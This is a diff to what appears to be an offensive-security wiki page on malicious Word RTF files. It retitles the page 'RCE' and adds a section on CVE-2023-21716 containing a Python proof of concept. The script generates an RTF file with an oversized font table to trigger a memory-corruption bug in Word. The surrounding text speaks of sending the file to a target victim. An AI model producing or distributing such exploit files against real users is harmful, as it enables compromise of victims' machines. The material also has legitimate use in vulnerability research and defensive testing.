@@ -1,4 +1,4 @@
-# MS Word - RTF Files
+# MS Word - RTF Files RCE
 
 ## Theory
 
@@ -40,3 +40,14 @@ Finally, send the `bad.rtf` file to the target. Once victim will open malicious 
 {% endtab %}
 {% endtabs %}
 
+### CVE-2023-21716
+
+{% tabs %}
+{% tab title="Exploit" %}
+The exploit isn't weaponized yet, but here is the python POC
+
+```python
+open("file.rtf","wb").write(("{\\rtf1{\n{\\fonttbl" + "".join([ ("{\\f%dA;}\n" % i) for i in range(0,32761) ]) + "}\n{\\rtlch no crash??}\n}}\n").encode('utf-8'))
+```
+{% endtab %}
+{% endtabs %}
